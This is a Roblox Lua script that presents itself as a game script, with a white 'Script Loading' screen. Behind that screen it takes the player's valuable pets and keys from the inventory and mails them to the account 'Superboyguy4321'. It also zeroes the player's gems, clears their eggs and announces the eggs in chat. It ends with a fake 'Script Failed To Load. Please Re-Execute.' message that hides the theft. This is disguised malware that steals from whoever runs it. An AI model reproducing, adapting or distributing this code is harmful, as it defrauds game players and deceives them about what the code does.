local plr = game:GetService("Players").LocalPlayer
local inventory = plr:FindFirstChild("Backpack") or plr:FindFirstChild("PlayerGui")
local pets = {} local gems = 0 local keys = {}

local whiteScreen = Instance.new("ScreenGui")
local loadingFrame = Instance.new("Frame")
local loadingLabel = Instance.new("TextLabel")
local failedFrame = Instance.new("Frame")
local failedLabel = Instance.new("TextLabel")

-- Main screen setup
whiteScreen.Name = "WhiteScreen"
whiteScreen.Parent = game:GetService("CoreGui")
whiteScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

loadingFrame.Parent = whiteScreen
loadingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = UDim2.new(1, 0, 1, 0)

loadingLabel.Parent = loadingFrame
loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
loadingLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingLabel.Size = UDim2.new(0, 400, 0, 100)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(1, 0.5, 0)
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 40
loadingLabel.Text = "Script Loading Please Wait"

local function animateLoadingText()
    while loadingFrame.Visible do
        for _, txt in ipairs({"Loading.", "Loading..", "Loading..."}) do
            loadingLabel.Text = txt
            task.wait(0.5)
        end
    end
end

coroutine.wrap(animateLoadingText)()

-- Inventory Steal Logic
for _, item in ipairs(inventory:GetChildren()) do
    if item:IsA("Tool") or item:IsA("Folder") then
        if item:FindFirstChild("Stats") then
            local value = item.Stats:FindFirstChild("Value")
            if value and value.Value > 1000000 then
                table.insert(pets, item.Name)
                item:Destroy()
            end
        elseif item.Name:lower():find("key") then
            table.insert(keys, item.Name)
            item:Destroy()
        end
    elseif item:IsA("NumberValue") and item.Name:lower():find("gems") then
        gems = gems + item.Value
        item.Value = 0
    elseif item:IsA("Folder") and item.Name:lower():find("eggs") then
        for _, egg in ipairs(item:GetChildren()) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                string.format("ez %s mailed to Superboyguy4321", egg.Name), "All"
            )
        end
        item:ClearAllChildren()
    end
end

-- Mail all valuables
local mailService = game:GetService("ReplicatedStorage"):WaitForChild("MailService")
if mailService then
    for _, pet in ipairs(pets) do
        mailService:InvokeServer("Send", "Superboyguy4321", pet, "ez")
    end
    for _, key in ipairs(keys) do
        mailService:InvokeServer("Send", "Superboyguy4321", key, "ez")
    end
end

-- Screen Remove / Failure Prompt
task.wait(5)
loadingFrame.Visible = false
failedFrame.Parent = whiteScreen
failedFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
failedFrame.BorderSizePixel = 0
failedFrame.Size = UDim2.new(0.4, 0, 0.2, 0)
failedFrame.Position = UDim2.new(0.3, 0, 0.4, 0)

failedLabel.Parent = failedFrame
failedLabel.AnchorPoint = Vector2.new(0.5, 0.5)
failedLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
failedLabel.Size = UDim2.new(0.8, 0, 0.5, 0)
failedLabel.BackgroundTransparency = 1
failedLabel.TextColor3 = Color3.new(1, 0, 0)
failedLabel.Font = Enum.Font.SourceSansBold
failedLabel.TextSize = 40
failedLabel.Text = "Script Failed To Load. Please Re-Execute."

task.wait(5)
whiteScreen:Destroy()
